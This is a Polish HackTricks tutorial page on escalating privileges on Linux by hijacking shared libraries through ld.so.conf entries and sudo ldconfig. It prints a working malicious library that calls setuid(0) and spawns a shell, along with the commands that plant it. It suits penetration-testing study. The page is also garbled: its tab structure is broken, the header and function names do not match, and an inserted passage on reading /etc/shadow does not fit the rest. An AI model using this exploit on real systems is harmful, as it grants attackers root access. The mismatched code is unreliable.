# Przykład wykorzystania podwyższenia uprawnień ld.so

<details>

<summary><strong>Naucz się hakować AWS od zera do bohatera z</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Inne sposoby wsparcia HackTricks:

* Jeśli chcesz zobaczyć swoją **firmę reklamowaną w HackTricks** lub **pobrać HackTricks w formacie PDF**, sprawdź [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Zdobądź [**oficjalne gadżety PEASS & HackTricks**](https://peass.creator-spring.com)
* Odkryj [**Rodzinę PEASS**](https://opensea.io/collection/the-peass-family), naszą kolekcję ekskluzywnych [**NFT**](https://opensea.io/collection/the-peass-family)
* **Dołącz do** 💬 [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegramowej**](https://t.me/peass) lub **śledź** nas na **Twitterze** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Podziel się swoimi sztuczkami hakerskimi, przesyłając PR-y do** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>

## Przygotuj środowisko

W poniższym rozdziale znajdziesz kod plików, które będziemy używać do przygotowania środowiska

{% tabs %}
{% tab title="sharedvuln.c" %}
```c
#include <stdio.h>
#include "libcustom.h"

int main(){
printf("Welcome to my amazing application!\n");
vuln_func();
return 0;
}
```
{% tab title="libcustom.h" %}

```c
#ifndef LIBCUSTOM_H
#define LIBCUSTOM_H

void custom_function();

#endif
```

{% endtab %}
```c
#include <stdio.h>

void vuln_func();
```
{% tab title="libcustom.c" %}

W pliku `libcustom.c` znajduje się przykład kodu biblioteki dynamicznej, która może być użyta do eskalacji uprawnień. Ta biblioteka dynamiczna jest skompilowana z flagą `-fPIC`, co oznacza, że jest ona niezależna od pozycji w pamięci. 

Kod biblioteki dynamicznej zawiera funkcję `evil_function()`, która jest wywoływana przez program główny. Funkcja ta wykonuje operację, która wymaga podwyższonych uprawnień, takich jak otwarcie pliku `/etc/shadow` w trybie do odczytu. 

Aby wykorzystać tę bibliotekę dynamiczną do eskalacji uprawnień, należy dodać ścieżkę do katalogu zawierającego tę bibliotekę do pliku konfiguracyjnego `ld.so.conf`. Następnie należy uruchomić program główny, który wywołuje funkcję `evil_function()`. W wyniku tego, funkcja `evil_function()` zostanie wykonana z podwyższonymi uprawnieniami, umożliwiając dostęp do chronionych zasobów systemowych.

```c
#include <stdio.h>

void evil_function() {
    FILE *file = fopen("/etc/shadow", "r");
    if (file) {
        char buffer[256];
        while (fgets(buffer, sizeof(buffer), file)) {
            printf("%s", buffer);
        }
        fclose(file);
    }
}
```

{% endtab %}
```c
#include <stdio.h>

void vuln_func()
{
puts("Hi");
}
```
{% tabs %}
{% tab title="Bash" %}
1. **Utwórz** te pliki na swoim komputerze w tym samym folderze.
2. **Skompiluj** bibliotekę: `gcc -shared -o libcustom.so -fPIC libcustom.c`
3. **Skopiuj** `libcustom.so` do `/usr/lib`: `sudo cp libcustom.so /usr/lib` (uprawnienia roota)
4. **Skompiluj** plik wykonywalny: `gcc sharedvuln.c -o sharedvuln -lcustom`

### Sprawdź środowisko

Sprawdź, czy _libcustom.so_ jest **ładowana** z _/usr/lib_ i czy możesz **wykonać** plik binarny.
{% endtab %}
{% endtabs %}
```
$ ldd sharedvuln
linux-vdso.so.1 =>  (0x00007ffc9a1f7000)
libcustom.so => /usr/lib/libcustom.so (0x00007fb27ff4d000)
libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007fb27fb83000)
/lib64/ld-linux-x86-64.so.2 (0x00007fb28014f000)

$ ./sharedvuln
Welcome to my amazing application!
Hi
```
## Wykorzystanie

W tym scenariuszu załóżmy, że **ktoś utworzył podatne wpisy** wewnątrz pliku w _/etc/ld.so.conf/_.
```bash
sudo echo "/home/ubuntu/lib" > /etc/ld.so.conf.d/privesc.conf
```
Narażony folder to _/home/ubuntu/lib_ (w którym mamy dostęp do zapisu).\
**Pobierz i skompiluj** poniższy kod wewnątrz tej ścieżki:
```c
//gcc -shared -o libcustom.so -fPIC libcustom.c

#include <stdio.h>
#include <unistd.h>
#include <sys/types.h>

void vuln_func(){
setuid(0);
setgid(0);
printf("I'm the bad library\n");
system("/bin/sh",NULL,NULL);
}
```
Teraz, gdy **utworzyliśmy złośliwą bibliotekę libcustom w nieprawidłowej** ścieżce, musimy poczekać na **ponowne uruchomienie** lub na wykonanie przez użytkownika root polecenia **`ldconfig`** (_jeśli możesz wykonać to polecenie jako **sudo** lub ma ustawiony bit **suid**, będziesz w stanie wykonać je samodzielnie_).

Po tym zdarzeniu **ponownie sprawdź**, z jakiego miejsca ładowana jest biblioteka `libcustom.so` przez plik wykonywalny `sharevuln`:
```c
$ldd sharedvuln
linux-vdso.so.1 =>  (0x00007ffeee766000)
libcustom.so => /home/ubuntu/lib/libcustom.so (0x00007f3f27c1a000)
libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007f3f27850000)
/lib64/ld-linux-x86-64.so.2 (0x00007f3f27e1c000)
```
Jak widać, jest **ładowane z `/home/ubuntu/lib`**, a jeśli jakikolwiek użytkownik je uruchomi, zostanie uruchomiona powłoka:
```c
$ ./sharedvuln
Welcome to my amazing application!
I'm the bad library
$ whoami
ubuntu
```
{% hint style="info" %}
Zauważ, że w tym przykładzie nie podnieśliśmy uprawnień, ale modyfikując wykonywane polecenia i **oczekując, aż użytkownik root lub inny uprzywilejowany użytkownik uruchomi podatny plik binarny**, będziemy mogli podnieść uprawnienia.
{% endhint %}

### Inne błędy konfiguracji - Ta sama podatność

W poprzednim przykładzie sfabrykowaliśmy błąd konfiguracji, w którym administrator **ustawił folder bez uprawnień w pliku konfiguracyjnym wewnątrz `/etc/ld.so.conf.d/`**.\
Ale istnieją inne błędy konfiguracji, które mogą spowodować tę samą podatność. Jeśli masz **uprawnienia do zapisu** w jakimś **pliku konfiguracyjnym** wewnątrz `/etc/ld.so.conf.d`, w folderze `/etc/ld.so.conf.d` lub w pliku `/etc/ld.so.conf`, możesz skonfigurować tę samą podatność i ją wykorzystać.

## Wykorzystanie 2

**Załóżmy, że masz uprawnienia sudo dla `ldconfig`**.\
Możesz wskazać `ldconfig`, **skąd mają być ładowane pliki konfiguracyjne**, więc możemy z tego skorzystać, aby spowodować, że `ldconfig` załaduje dowolne foldery.\
Więc stwórzmy potrzebne pliki i foldery, aby załadować "/tmp":
```bash
cd /tmp
echo "include /tmp/conf/*" > fake.ld.so.conf
echo "/tmp" > conf/evil.conf
```
Teraz, jak wskazano w **poprzednim wykorzystaniu**, **utwórz złośliwą bibliotekę wewnątrz `/tmp`**.\
I na koniec, załaduj ścieżkę i sprawdź, skąd jest ładowana biblioteka binarna:
```bash
ldconfig -f fake.ld.so.conf

ldd sharedvuln
linux-vdso.so.1 =>  (0x00007fffa2dde000)
libcustom.so => /tmp/libcustom.so (0x00007fcb07756000)
libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007fcb0738c000)
/lib64/ld-linux-x86-64.so.2 (0x00007fcb07958000)
```
**Jak widać, posiadając uprawnienia sudo dla `ldconfig`, można wykorzystać tę samą podatność.**

{% hint style="info" %}
**Nie znalazłem** niezawodnego sposobu na wykorzystanie tej podatności, jeśli `ldconfig` jest skonfigurowany z bitem **suid**. Pojawia się następujący błąd: `/sbin/ldconfig.real: Nie można utworzyć tymczasowego pliku cache /etc/ld.so.cache~: Brak dostępu`
{% endhint %}

## Odwołania

* [https://www.boiteaklou.fr/Abusing-Shared-Libraries.html](https://www.boiteaklou.fr/Abusing-Shared-Libraries.html)
* [https://blog.pentesteracademy.com/abusing-missing-library-for-privilege-escalation-3-minute-read-296dcf81bec2](https://blog.pentesteracademy.com/abusing-missing-library-for-privilege-escalation-3-minute-read-296dcf81bec2)
* Maszyna Dab w HTB

<details>

<summary><strong>Naucz się hakować AWS od zera do bohatera z</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Inne sposoby wsparcia HackTricks:

* Jeśli chcesz zobaczyć swoją **firmę reklamowaną w HackTricks** lub **pobrać HackTricks w formacie PDF**, sprawdź [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Zdobądź [**oficjalne gadżety PEASS & HackTricks**](https://peass.creator-spring.com)
* Odkryj [**Rodzinę PEASS**](https://opensea.io/collection/the-peass-family), naszą kolekcję ekskluzywnych [**NFT**](https://opensea.io/collection/the-peass-family)
* **Dołącz do** 💬 [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegramowej**](https://t.me/peass) lub **śledź** nas na **Twitterze** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Podziel się swoimi trikami hakerskimi, przesyłając PR do** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
